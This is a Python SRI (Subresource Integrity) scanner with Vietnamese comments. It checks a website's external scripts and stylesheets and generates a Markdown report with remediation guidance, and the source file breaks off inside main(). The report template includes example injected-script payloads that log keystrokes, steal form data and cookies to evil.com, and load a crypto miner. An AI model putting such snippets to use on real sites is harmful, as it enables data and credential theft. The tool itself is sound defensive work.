#!/usr/bin/env python3
"""
.\scanSRI.py
Subresource Integrity (SRI) Scanner & Report Generator
Quét lỗi thiếu hoặc cấu hình sai SRI cho các tài nguyên external (JS/CSS)
và tạo báo cáo chi tiết về các vấn đề bảo mật
"""

import requests
import sys
from datetime import datetime
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re
import hashlib
import base64

class SRISecurityScanner:
    def __init__(self, url):
        self.url = self.normalize_url(url)
        self.domain = urlparse(self.url).netloc
        self.scan_time = datetime.now()
        self.results = {}
        
    def normalize_url(self, url):
        """Chuẩn hóa URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def scan_sri(self):
        """Quét Subresource Integrity"""
        print(f"\n{'='*70}")
        print(f"🔍 ĐANG QUÉT: {self.url}")
        print(f"{'='*70}\n")
        
        try:
            # Test GET request để lấy HTML
            print("📤 Test 1: Gửi GET request để lấy HTML content...")
            response = requests.get(self.url, timeout=10, allow_redirects=True)
            
            self.results['status_code'] = response.status_code
            self.results['headers'] = dict(response.headers)
            self.results['html_content'] = response.text
            
            print(f"   ✓ Status Code: {response.status_code}")
            print(f"   ✓ Content Length: {len(response.text)} bytes")
            
            # Parse HTML
            print("\n📤 Test 2: Phân tích HTML để tìm external resources...")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Tìm tất cả script tags
            scripts = soup.find_all('script', src=True)
            print(f"   ✓ Tìm thấy {len(scripts)} script tags có src")
            
            # Tìm tất cả link tags (CSS)
            links = soup.find_all('link', rel='stylesheet', href=True)
            print(f"   ✓ Tìm thấy {len(links)} stylesheet links")
            
            # Phân tích từng resource
            print("\n📤 Test 3: Kiểm tra SRI cho từng resource...")
            self.results['scripts'] = self.analyze_scripts(scripts)
            self.results['stylesheets'] = self.analyze_stylesheets(links)
            
            # Phân tích rủi ro
            self.analyze_risk()
            
            print(f"\n{'='*70}")
            print(f"✅ QUÉT HOÀN TẤT")
            print(f"{'='*70}\n")
            
            return True
            
        except requests.exceptions.Timeout:
            print(f"❌ TIMEOUT - Không thể kết nối")
            return False
        except requests.exceptions.ConnectionError:
            print(f"❌ CONNECTION ERROR")
            return False
        except Exception as e:
            print(f"❌ LỖI: {str(e)}")
            return False
    
    def is_external_url(self, url):
        """Kiểm tra xem URL có phải external không"""
        if not url:
            return False
        
        # Handle relative URLs
        if url.startswith('//'):
            url = 'https:' + url
        elif url.startswith('/'):
            return False
        elif not url.startswith(('http://', 'https://')):
            return False
        
        parsed = urlparse(url)
        return parsed.netloc != self.domain
    
    def analyze_scripts(self, scripts):
        """Phân tích script tags"""
        script_analysis = {
            'total': len(scripts),
            'external': 0,
            'with_sri': 0,
            'without_sri': 0,
            'details': []
        }
        
        for script in scripts:
            src = script.get('src', '')
            
            # Xử lý relative URL
            if src.startswith('//'):
                src = 'https:' + src
            elif src.startswith('/'):
                src = urljoin(self.url, src)
            
            is_external = self.is_external_url(src)
            
            if is_external:
                script_analysis['external'] += 1
                
                integrity = script.get('integrity', None)
                crossorigin = script.get('crossorigin', None)
                
                has_sri = integrity is not None
                
                if has_sri:
                    script_analysis['with_sri'] += 1
                    status = "✅"
                    print(f"   ✅ Script: {src[:60]}... (CÓ SRI)")
                else:
                    script_analysis['without_sri'] += 1
                    status = "❌"
                    print(f"   ❌ Script: {src[:60]}... (THIẾU SRI)")
                
                script_analysis['details'].append({
                    'src': src,
                    'is_external': True,
                    'has_integrity': has_sri,
                    'integrity': integrity,
                    'has_crossorigin': crossorigin is not None,
                    'crossorigin': crossorigin,
                    'status': status
                })
        
        return script_analysis
    
    def analyze_stylesheets(self, links):
        """Phân tích stylesheet links"""
        css_analysis = {
            'total': len(links),
            'external': 0,
            'with_sri': 0,
            'without_sri': 0,
            'details': []
        }
        
        for link in links:
            href = link.get('href', '')
            
            # Xử lý relative URL
            if href.startswith('//'):
                href = 'https:' + href
            elif href.startswith('/'):
                href = urljoin(self.url, href)
            
            is_external = self.is_external_url(href)
            
            if is_external:
                css_analysis['external'] += 1
                
                integrity = link.get('integrity', None)
                crossorigin = link.get('crossorigin', None)
                
                has_sri = integrity is not None
                
                if has_sri:
                    css_analysis['with_sri'] += 1
                    status = "✅"
                    print(f"   ✅ CSS: {href[:60]}... (CÓ SRI)")
                else:
                    css_analysis['without_sri'] += 1
                    status = "❌"
                    print(f"   ❌ CSS: {href[:60]}... (THIẾU SRI)")
                
                css_analysis['details'].append({
                    'href': href,
                    'is_external': True,
                    'has_integrity': has_sri,
                    'integrity': integrity,
                    'has_crossorigin': crossorigin is not None,
                    'crossorigin': crossorigin,
                    'status': status
                })
        
        return css_analysis
    
    def analyze_risk(self):
        """Phân tích mức độ rủi ro"""
        scripts = self.results.get('scripts', {})
        stylesheets = self.results.get('stylesheets', {})
        
        total_external = scripts.get('external', 0) + stylesheets.get('external', 0)
        total_without_sri = scripts.get('without_sri', 0) + stylesheets.get('without_sri', 0)
        total_with_sri = scripts.get('with_sri', 0) + stylesheets.get('with_sri', 0)
        
        self.results['total_external'] = total_external
        self.results['total_without_sri'] = total_without_sri
        self.results['total_with_sri'] = total_with_sri
        
        self.results['is_vulnerable'] = False
        self.results['risk_level'] = 'Low'
        self.results['cvss_score'] = 0.0
        self.results['protection_score'] = 0
        
        score = 0
        issues = []
        protections = []
        
        if total_external == 0:
            # Không có external resources
            score = 100
            protections.append("Không có external resources - không cần SRI")
            self.results['assessment'] = '✅ AN TOÀN - Không có external resources'
        else:
            # Có external resources
            if total_without_sri == 0:
                # Tất cả đều có SRI
                score = 100
                protections.append(f"Tất cả {total_external} external resources đều có SRI")
                self.results['assessment'] = '✅ AN TOÀN - Tất cả external resources đều có SRI'
            elif total_with_sri == 0:
                # Không có SRI nào
                self.results['is_vulnerable'] = True
                self.results['risk_level'] = 'High'
                self.results['cvss_score'] = 5.3
                score = 0
                issues.append(f"Tất cả {total_external} external resources đều THIẾU SRI")
                self.results['assessment'] = '🔴 DỄ BỊ TẤN CÔNG - Không có SRI protection'
            else:
                # Một số có, một số không
                self.results['is_vulnerable'] = True
                self.results['risk_level'] = 'Medium'
                self.results['cvss_score'] = 4.3
                score = int((total_with_sri / total_external) * 100)
                issues.append(f"{total_without_sri}/{total_external} external resources THIẾU SRI")
                protections.append(f"{total_with_sri}/{total_external} external resources ĐÃ CÓ SRI")
                self.results['assessment'] = '⚠️ BẢO VỆ YẾU - Một số resources thiếu SRI'
        
        self.results['protection_score'] = score
        self.results['issues'] = issues
        self.results['protections'] = protections
    
    def generate_sri_hash(self, url):
        """Tạo SRI hash cho một URL (ví dụ)"""
        try:
            response = requests.get(url, timeout=10)
            content = response.content
            
            # Tạo SHA384 hash
            sha384_hash = hashlib.sha384(content).digest()
            base64_hash = base64.b64encode(sha384_hash).decode('utf-8')
            
            return f"sha384-{base64_hash}"
        except:
            return None
    
    def generate_markdown_report(self):
        """Tạo báo cáo Markdown chi tiết"""
        
        report = f"""# 🔐 Phân biệt kỹ thuật: "Subresource Integrity (SRI) Not Implemented"

**Ngày phân tích:** {self.scan_time.strftime('%d/%m/%Y %H:%M:%S')}  
**Website:** {self.url}  
**Domain:** {self.domain}  
**Phân loại:** {"🔴 Vulnerability Detected" if self.results['is_vulnerable'] else "✅ Protected"}

---

## 🚀 Quick Test Commands (Copy & Paste)

### Test nhanh bằng browser (30 giây):

```bash
# Mở Developer Tools (F12) trong Chrome/Firefox
# → Console → chạy lệnh:

// Kiểm tra scripts thiếu SRI
document.querySelectorAll('script[src]').forEach(s => {{
  const isExternal = s.src && !s.src.startsWith(window.location.origin);
  if (isExternal && !s.integrity) {{
    console.error('❌ THIẾU SRI:', s.src);
  }}
}});

// Kiểm tra CSS thiếu SRI
document.querySelectorAll('link[rel="stylesheet"][href]').forEach(l => {{
  const isExternal = l.href && !l.href.startsWith(window.location.origin);
  if (isExternal && !l.integrity) {{
    console.error('❌ THIẾU SRI:', l.href);
  }}
}});
```

### Test bằng online tools:

```bash
# 1. SecurityHeaders.com
https://securityheaders.com/?q={self.url}

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/{self.domain}

# 3. Scan lại bằng tool này
python3 scanSRI.py {self.url}
```

---

## 📚 1. Tham chiếu chuẩn kỹ thuật

- **OWASP Top 10 2021:** A05:2021 – Security Misconfiguration
- **CWE-353:** Missing Support for Integrity Check
- **W3C SRI Spec:** Subresource Integrity Level 2
- **MDN Web Docs:** Subresource Integrity

### SRI là gì?

**Subresource Integrity (SRI)** là cơ chế bảo mật cho phép trình duyệt xác minh rằng các tài nguyên được tải từ CDN hoặc nguồn bên ngoài **không bị thay đổi hoặc can thiệp**.

**Cách hoạt động:**
1. Developer tạo hash (SHA256/384/512) của file JS/CSS
2. Thêm hash vào thuộc tính `integrity` của tag
3. Browser tải file và tính hash
4. Nếu hash khớp → file được thực thi
5. Nếu hash không khớp → file bị chặn

**Ví dụ:**
```html
<!-- ✅ CÓ SRI - An toàn -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
        crossorigin="anonymous"></script>

<!-- ❌ KHÔNG CÓ SRI - Nguy hiểm -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
```

**Tại sao cần SRI?**
- Nếu CDN bị hack, attacker có thể thay thế file bằng mã độc
- Không có SRI → trình duyệt không biết file đã bị thay đổi
- Có SRI → trình duyệt phát hiện và chặn file độc

---

## 🧪 2. Kết quả kiểm tra thực tế

### Test 1: External Scripts

**Tổng số script tags:** {self.results.get('scripts', {}).get('total', 0)}  
**External scripts:** {self.results.get('scripts', {}).get('external', 0)}  
**Scripts CÓ SRI:** {self.results.get('scripts', {}).get('with_sri', 0)}  
**Scripts THIẾU SRI:** {self.results.get('scripts', {}).get('without_sri', 0)}

"""

        # Chi tiết từng script
        scripts = self.results.get('scripts', {}).get('details', [])
        if scripts:
            report += "| URL | SRI | Crossorigin | Status |\n"
            report += "|-----|-----|-------------|--------|\n"
            
            for script in scripts:
                url_short = script['src'][:60] + "..." if len(script['src']) > 60 else script['src']
                sri_status = "✅ Có" if script['has_integrity'] else "❌ Thiếu"
                cors_status = "✅" if script['has_crossorigin'] else "❌"
                status = script['status']
                
                report += f"| `{url_short}` | {sri_status} | {cors_status} | {status} |\n"
        
        report += "\n### Test 2: External Stylesheets\n\n"
        report += f"**Tổng số CSS links:** {self.results.get('stylesheets', {}).get('total', 0)}  \n"
        report += f"**External CSS:** {self.results.get('stylesheets', {}).get('external', 0)}  \n"
        report += f"**CSS CÓ SRI:** {self.results.get('stylesheets', {}).get('with_sri', 0)}  \n"
        report += f"**CSS THIẾU SRI:** {self.results.get('stylesheets', {}).get('without_sri', 0)}\n\n"
        
        # Chi tiết từng CSS
        stylesheets = self.results.get('stylesheets', {}).get('details', [])
        if stylesheets:
            report += "| URL | SRI | Crossorigin | Status |\n"
            report += "|-----|-----|-------------|--------|\n"
            
            for css in stylesheets:
                url_short = css['href'][:60] + "..." if len(css['href']) > 60 else css['href']
                sri_status = "✅ Có" if css['has_integrity'] else "❌ Thiếu"
                cors_status = "✅" if css['has_crossorigin'] else "❌"
                status = css['status']
                
                report += f"| `{url_short}` | {sri_status} | {cors_status} | {status} |\n"
        
        report += """

---

## 📊 3. So sánh: Có SRI vs Không có SRI

### ❌ Trường hợp KHÔNG CÓ SRI (nguy hiểm):

```html
<!-- Website vulnerable -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
```

**Rủi ro thực tế:**

1. **CDN bị hack:**
   - Attacker xâm nhập vào CDN server
   - Thay thế `jquery.min.js` bằng version có backdoor
   - TẤT CẢ websites sử dụng CDN này đều bị nhiễm mã độc

2. **Man-in-the-Middle Attack:**
   ```javascript
   // File gốc: jquery.min.js
   // File bị inject bởi attacker:
   !function(){
     // Mã độc keylogger
     document.addEventListener('keypress', e => {
       fetch('https://evil.com/log?key=' + e.key);
     });
   }();
   // ... original jQuery code ...
   ```

3. **DNS Hijacking:**
   - Attacker kiểm soát DNS của cdn.jsdelivr.net
   - Redirect đến server độc hại với file giả
   - User không biết đã tải file từ nguồn sai

"""
        
        # Trường hợp hiện tại
        if self.results.get('total_external', 0) == 0:
            report += f"""### ✅ Trường hợp HIỆN TẠI (không có external resources):

**Website không sử dụng external resources**
- ✅ Không có rủi ro từ CDN third-party
- ✅ Tất cả resources đều self-hosted
- ✅ Không cần implement SRI

"""
        elif not self.results['is_vulnerable']:
            report += f"""### ✅ Trường hợp HIỆN TẠI (được bảo vệ tốt):

**Tất cả {self.results['total_external']} external resources đều có SRI:**

```html
<!-- Ví dụ từ website -->
"""
            # Lấy 1-2 ví dụ có SRI
            for script in scripts:
                if script['has_integrity']:
                    report += f"""<script src="{script['src']}"
        integrity="{script['integrity']}"
        crossorigin="{script['crossorigin']}"></script>
"""
                    break
            
            report += "```\n\n**Bảo vệ:**\n"
            for prot in self.results.get('protections', []):
                report += f"- ✅ {prot}\n"
            
        else:
            report += f"""### 🔴 Trường hợp HIỆN TẠI (có lỗ hổng):

**{self.results['total_without_sri']}/{self.results['total_external']} external resources THIẾU SRI:**

**Vấn đề:**
"""
            for issue in self.results.get('issues', []):
                report += f"- 🔴 {issue}\n"
            
            report += "\n**Các resources thiếu SRI:**\n"
            
            # Liệt kê resources thiếu SRI
            for script in scripts:
                if not script['has_integrity']:
                    report += f"- ❌ Script: `{script['src']}`\n"
            
            for css in stylesheets:
                if not css['has_integrity']:
                    report += f"- ❌ CSS: `{css['href']}`\n"
        
        report += """

---

## 🎯 4. Kịch bản tấn công thực tế

### Kịch bản 1: CDN Compromise

```javascript
// 1. Attacker hack vào cdn.jsdelivr.net
// 2. Thay thế jquery.min.js:

// Original jQuery code...
(function($) {
  // Mã độc được inject
  setTimeout(function() {
    // Đánh cắp form data
    $('form').on('submit', function() {
      var formData = $(this).serialize();
      $.post('https://evil.com/steal', {data: formData});
    });
    
    // Đánh cắp cookie
    fetch('https://evil.com/cookie?c=' + document.cookie);
    
    // Crypto mining
    new Worker('https://evil.com/miner.js');
  }, 5000);
})(jQuery);
```

**Impact:**
- Hàng nghìn websites sử dụng CDN này đều bị ảnh hưởng
- User data bị đánh cắp mà không hề biết
- Website reputation bị hủy hoại

### Kịch bản 2: Targeted Attack

```html
<!-- Attacker biết website không có SRI -->
<!-- Tạo phishing page giả mạo CDN -->

<!-- Victim's website loads: -->
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>

<!-- Attacker's DNS hijacking redirects to: -->
<!-- https://cdn-jsdelivr-net.evil.com/npm/lodash@4.17.21/lodash.min.js -->

<!-- File có mã độc: -->
<script>
// Fake lodash code + keylogger + session hijacking
</script>
```

**Với SRI → Tấn công BỊ CHẶN:**
```html
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
        integrity="sha384-correct-hash-here"
        crossorigin="anonymous"></script>

<!-- Browser tính hash của file độc → Không khớp → ❌ Blocked -->
<!-- Console error: "Failed to find a valid digest in the 'integrity' attribute" -->
```

---

## 📋 5. Bảng đánh giá bảo vệ

| Tiêu chí | Kết quả | Đánh giá | Điểm |
|----------|---------|----------|------|
"""
        
        total_ext = self.results.get('total_external', 0)
        if total_ext == 0:
            report += "| External Resources | ❌ Không có | Không cần SRI | 100/100 |\n"
        else:
            with_sri = self.results.get('total_with_sri', 0)
            without_sri = self.results.get('total_without_sri', 0)
            
            coverage = int((with_sri / total_ext) * 100) if total_ext > 0 else 0
            
            report += f"| External Resources | ✅ {total_ext} | - | - |\n"
            report += f"| Resources với SRI | {'✅' if with_sri > 0 else '❌'} {with_sri} | {coverage}% coverage | {coverage}/100 |\n"
            report += f"| Resources thiếu SRI | {'❌' if without_sri > 0 else '✅'} {without_sri} | {'Cần khắc phục' if without_sri > 0 else 'An toàn'} | - |\n"
        
        score = self.results['protection_score']
        report += f"\n**Tổng điểm bảo vệ:** {score}/100\n\n"
        
        if score >= 90:
            report += "✅ **Đánh giá:** BẢO VỆ TỐT - SRI được implement đầy đủ\n"
        elif score >= 50:
            report += "⚠️ **Đánh giá:** BẢO VỆ TRUNG BÌNH - Cần tăng cường SRI\n"
        elif score > 0:
            report += "🔴 **Đánh giá:** BẢO VỆ YẾU - Hầu hết resources thiếu SRI\n"
        else:
            report += "🔴 **Đánh giá:** KHÔNG CÓ BẢO VỆ - Không có SRI nào\n"
        
        if self.results.get('issues'):
            report += "\n### Vấn đề phát hiện:\n\n"
            for issue in self.results['issues']:
                report += f"- ❌ {issue}\n"
        
        if self.results.get('protections'):
            report += "\n### Điểm mạnh:\n\n"
            for prot in self.results['protections']:
                report += f"- ✅ {prot}\n"
        
        report += """

---

## 🔧 6. Biện pháp khắc phục

"""
        
        if self.results['is_vulnerable'] or self.results.get('total_external', 0) > 0:
            report += "### 🔴 HƯỚNG DẪN THÊM SRI\n\n"
        else:
            report += "### ✅ Website an toàn, không cần thêm SRI\n\n"
        
        report += """### Step 1: Tạo SRI Hash

**Cách 1: Sử dụng online tool**

```bash
# SRI Hash Generator
https://www.srihash.org/

# Paste URL của resource → Copy hash
```

**Cách 2: Sử dụng command line**

```bash
# SHA384 (khuyến nghị)
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js | \\
  openssl dgst -sha384 -binary | \\
  openssl base64 -A

# SHA256 (nhanh hơn nhưng kém an toàn)
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js | \\
  openssl dgst -sha256 -binary | \\
  openssl base64 -A

# SHA512 (an toàn nhất nhưng chậm)
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js | \\
  openssl dgst -sha512 -binary | \\
  openssl base64 -A
```

**Cách 3: Sử dụng Node.js**

```javascript
// generate-sri.js
const crypto = require('crypto');
const https = require('https');

function generateSRI(url, algorithm = 'sha384') {
  https.get(url, (res) => {
    const hash = crypto.createHash(algorithm);
    res.on('data', (data) => hash.update(data));
    res.on('end', () => {
      const base64Hash = hash.digest('base64');
      console.log(`${algorithm}-${base64Hash}`);
    });
  });
}

// Usage
generateSRI('https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js');
```

### Step 2: Thêm SRI vào HTML

**Scripts:**
```html
<!-- ❌ TRƯỚC: Không có SRI -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>

<!-- ✅ SAU: Có SRI -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
        crossorigin="anonymous"></script>
```

**Stylesheets:**
```html
<!-- ❌ TRƯỚC: Không có SRI -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">

<!-- ✅ SAU: Có SRI -->
<link rel="stylesheet" 
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
      crossorigin="anonymous">
```

### Step 3: Tự động hóa SRI (Webpack/Vite)

**Webpack:**
```javascript
// webpack.config.js
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha384'],
      enabled: process.env.NODE_ENV === 'production',
    }),
  ],
  output: {
    crossOriginLoading: 'anonymous',
  },
};
```

**Vite:**
```javascript
// vite.config.js
import { defineConfig } from 'vite';
import { viteSingleFile } from 'vite-plugin-singlefile';

export default defineConfig({
  plugins: [
    {
      name: 'add-sri',
      transformIndexHtml(html) {
        // Add SRI to external resources
        return html.replace(
          /<(script|link)[^>]*src="(https?:\/\/[^"]+)"[^>]*>/g,
          (match, tag, url) => {
            // Generate and add integrity attribute
            return match.replace('>', ` integrity="sha384-..." crossorigin="anonymous">`);
          }
        );
      },
    },
  ],
});
```

### Step 4: Thêm CSP để yêu cầu SRI (Optional)

```nginx
# Nginx - Yêu cầu SRI cho tất cả scripts và styles
add_header Content-Security-Policy "require-sri-for script style;" always;
```

**⚠️ Lưu ý quan trọng:**

1. **crossorigin="anonymous" BẮT BUỘC:**
   - Không có crossorigin → SRI không hoạt động với CORS resources
   - Always thêm `crossorigin="anonymous"` cùng với `integrity`

2. **Hash phải chính xác:**
   - Nếu file thay đổi (kể cả 1 byte) → hash không khớp → file bị chặn
   - Luôn generate lại hash khi update version

3. **Fallback strategy:**
   ```html
   <!-- Cách 1: Fallback to self-hosted -->
   <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
           integrity="sha384-..."
           crossorigin="anonymous"
           onerror="this.onerror=null;this.src='/js/jquery.min.js'"></script>
   
   <!-- Cách 2: Multiple CDN fallback -->
   <script>
   window.jQuery || document.write('<script src="https://cdn2.com/jquery.min.js"><\\/script>');
   </script>
   ```

---

## ✅ 7. Kiểm tra lại sau khi khắc phục

### Bước 1: Kiểm tra bằng Browser DevTools

```bash
# 1. Mở """ + self.url + """ trong Chrome
# 2. F12 → Console
# 3. Chạy script:

// Kiểm tra tất cả external resources có SRI
let missingCount = 0;

document.querySelectorAll('script[src]').forEach(s => {
  const isExternal = s.src && !s.src.startsWith(window.location.origin);
  if (isExternal && !s.integrity) {
    console.error('❌ Script thiếu SRI:', s.src);
    missingCount++;
  } else if (isExternal && s.integrity) {
    console.log('✅ Script có SRI:', s.src);
  }
});

document.querySelectorAll('link[rel="stylesheet"][href]').forEach(l => {
  const isExternal = l.href && !l.href.startsWith(window.location.origin);
  if (isExternal && !l.integrity) {
    console.error('❌ CSS thiếu SRI:', l.href);
    missingCount++;
  } else if (isExternal && l.integrity) {
    console.log('✅ CSS có SRI:', l.href);
  }
});

console.log(missingCount === 0 ? '✅ TẤT CẢ ĐỀU CÓ SRI!' : `❌ ${missingCount} resources thiếu SRI`);
```

### Bước 2: Test SRI có hoạt động không

```javascript
// Test: Thay đổi integrity hash để xem có bị chặn không
// 1. Inspect element một script có SRI
// 2. Edit HTML → thay đổi integrity hash
// 3. Reload page
// 4. Kiểm tra Console → phải thấy error:
// "Failed to find a valid digest in the 'integrity' attribute"
```

### Bước 3: Scan lại bằng online tools

```bash
# 1. SecurityHeaders.com
https://securityheaders.com/?q=""" + self.url + """

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/""" + self.domain + """

# 3. Scan lại bằng tool này
python3 scanSRI.py """ + self.url + """

# Điểm protection score phải = 100
```

### Bước 4: Test với modified file

```bash
# Tạo test case: Giả lập CDN bị hack

# 1. Download original file
curl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js > jquery.original.js

# 2. Modify file (thêm 1 ký tự)
echo "/* hacked */" >> jquery.original.js

# 3. Host file modified locally và point <script> đến đó
# 4. Nếu SRI hoạt động → file sẽ BỊ CHẶN với error trong Console

# Expected error:
# "Failed to find a valid digest in the 'integrity' attribute for 
#  resource 'https://...' with computed SHA-384 integrity '...'. 
#  The resource has been blocked."
```

### Bước 5: Automated testing

```javascript
// sri-test.js - Playwright/Puppeteer test
const { test, expect } = require('@playwright/test');

test('All external resources have SRI', async ({ page }) => {
  await page.goto('""" + self.url + """');
  
  const scriptsWithoutSRI = await page.evaluate(() => {
    return Array.from(document.querySelectorAll('script[src]'))
      .filter(s => {
        const isExternal = s.src && !s.src.startsWith(window.location.origin);
        return isExternal && !s.integrity;
      })
      .map(s => s.src);
  });
  
  const cssWithoutSRI = await page.evaluate(() => {
    return Array.from(document.querySelectorAll('link[rel="stylesheet"][href]'))
      .filter(l => {
        const isExternal = l.href && !l.href.startsWith(window.location.origin);
        return isExternal && !l.integrity;
      })
      .map(l => l.href);
  });
  
  expect(scriptsWithoutSRI).toHaveLength(0);
  expect(cssWithoutSRI).toHaveLength(0);
});
```

---

## 📊 8. Kết luận và khuyến nghị

### Đánh giá tổng quan:

"""
        
        if self.results['is_vulnerable']:
            report += f"""🔴 **Website CÓ LỖ HỔNG SRI**

**Điểm bảo vệ:** {self.results['protection_score']}/100
**Mức độ rủi ro:** {self.results['risk_level']}
**CVSS Score:** {self.results['cvss_score']}

**Vấn đề phát hiện:**
"""
            for issue in self.results.get('issues', []):
                report += f"- ❌ {issue}\n"
            
            report += """
**Tác động:**
- CDN bị hack có thể inject mã độc vào website
- Attacker có thể thực thi arbitrary JavaScript
- Đánh cắp user data, session tokens, credentials
- Website reputation bị hủy hoại

**Hành động khuyến nghị:**
1. 🔴 **KHẨN CẤP** - Thêm SRI cho TẤT CẢ external resources (Step 1-2 trong mục 6)
2. 🧪 **TEST KỸ** - Verify SRI hoạt động đúng (mục 7)
3. ✅ **VERIFY** - Scan lại bằng tool và online services
4. 🔄 **AUTOMATE** - Setup CI/CD để auto-generate SRI (Step 3 trong mục 6)
5. 📊 **MONITOR** - Regular scan (monthly) để đảm bảo không bỏ sót
"""
        elif self.results.get('total_external', 0) == 0:
            report += f"""✅ **Website AN TOÀN**

**Điểm bảo vệ:** {self.results['protection_score']}/100

**Đánh giá:**
- Website không sử dụng external resources
- Không có rủi ro từ CDN third-party
- Không cần implement SRI

**Hành động khuyến nghị:**
1. ✅ **MAINTAIN** - Giữ nguyên strategy không dùng external CDN
2. 📊 **MONITOR** - Nếu sau này thêm CDN, nhớ implement SRI
3. 📄 **DOCUMENT** - Lưu báo cáo này cho audit
"""
        else:
            report += f"""✅ **Website ĐÃ CÓ SRI**

**Điểm bảo vệ:** {self.results['protection_score']}/100
**Mức độ rủi ro:** {self.results['risk_level']}

**Bảo vệ hiện tại:**
"""
            for prot in self.results.get('protections', []):
                report += f"- ✅ {prot}\n"
            
            report += """
**Đánh giá:**
- Tất cả external resources đều có SRI
- Website được bảo vệ khỏi CDN compromise
- Tuân thủ security best practices

**Hành động khuyến nghị:**
1. ✅ **MAINTAIN** - Duy trì cấu hình hiện tại
2. 🔄 **UPDATE** - Luôn generate lại SRI hash khi update dependencies
3. 📊 **MONITOR** - Quarterly scan để verify SRI vẫn đúng
4. 🚀 **IMPROVE** - Consider thêm CSP require-sri-for directive
"""
        
        report += """

---

## 📖 9. SRI Best Practices

### 1. Luôn sử dụng SHA-384 hoặc SHA-512

```html
<!-- ✅ TỐT -->
<script src="..." integrity="sha384-..." crossorigin="anonymous"></script>
<script src="..." integrity="sha512-..." crossorigin="anonymous"></script>

<!-- ⚠️ CHẤP NHẬN ĐƯỢC -->
<script src="..." integrity="sha256-..." crossorigin="anonymous"></script>

<!-- ❌ KHÔNG BAO GIỜ -->
<script src="..." integrity="md5-..." crossorigin="anonymous"></script>
```

### 2. Multiple hashes cho fallback

```html
<!-- Browser sẽ thử từng hash cho đến khi tìm được hash khớp -->
<script src="https://cdn.example.com/framework.js"
        integrity="sha384-hash1 sha512-hash2"
        crossorigin="anonymous"></script>
```

### 3. SRI với dynamic imports

```javascript
// Dynamic import với SRI
import('https://cdn.example.com/module.js')
  .then(module => {
    // Module đã được verify bởi browser
  })
  .catch(err => {
    console.error('SRI verification failed:', err);
    // Fallback to self-hosted
    return import('/js/module.js');
  });
```

### 4. Monitoring SRI failures

```javascript
// Global error handler cho SRI failures
window.addEventListener('error', (e) => {
  if (e.target.tagName === 'SCRIPT' || e.target.tagName === 'LINK') {
    console.error('SRI failure detected:', {
      url: e.target.src || e.target.href,
      integrity: e.target.integrity
    });
    
    // Send to monitoring service
    fetch('/api/log-sri-failure', {
      method: 'POST',
      body: JSON.stringify({
        resource: e.target.src || e.target.href,
        timestamp: new Date().toISOString()
      })
    });
  }
}, true);
```

### 5. CI/CD Integration

```yaml
# .github/workflows/sri-check.yml
name: Check SRI

on: [push, pull_request]

jobs:
  sri-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Check SRI for external resources
        run: |
          python3 scanSRI.py https://your-site.com
          
      - name: Fail if SRI missing
        run: |
          if grep -q "THIẾU SRI" sri_report.md; then
            echo "❌ External resources missing SRI!"
            exit 1
          fi
```

---

## 🔗 References

- [W3C SRI Specification](https://www.w3.org/TR/SRI/)
- [MDN - Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
- [SRI Hash Generator](https://www.srihash.org/)
- [OWASP SRI Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html)

---

**Prepared by:** SRI Security Scanner  
**Scan Time:** """ + self.scan_time.strftime('%Y-%m-%d %H:%M:%S') + """  
**Report Version:** 1.0  
**Tool Version:** 1.0.0
"""
        
        return report
    
    def save_report(self, filename=None):
        """Lưu báo cáo ra file"""
        if filename is None:
            timestamp = self.scan_time.strftime('%Y%m%d_%H%M%S')
            filename = f"sri_report_{self.domain}_{timestamp}.md"
        
        report_content = self.generate_markdown_report()
        
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(report_content)
            
            print(f"✅ Đã lưu báo cáo: {filename}")
            return filename
        except Exception as e:
            print(f"❌ Lỗi khi lưu file: {str(e)}")
            return None

def main():
    print("="*70)
    print("🛡️  SUBRESOURCE INTEGRITY (SRI) SCANNER")
    print("="*70)
    print("Công cụ quét lỗi thiếu SRI và tạo báo cáo chi tiết")
    print("="*70 + "\n")
    
    # Lấy URL
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
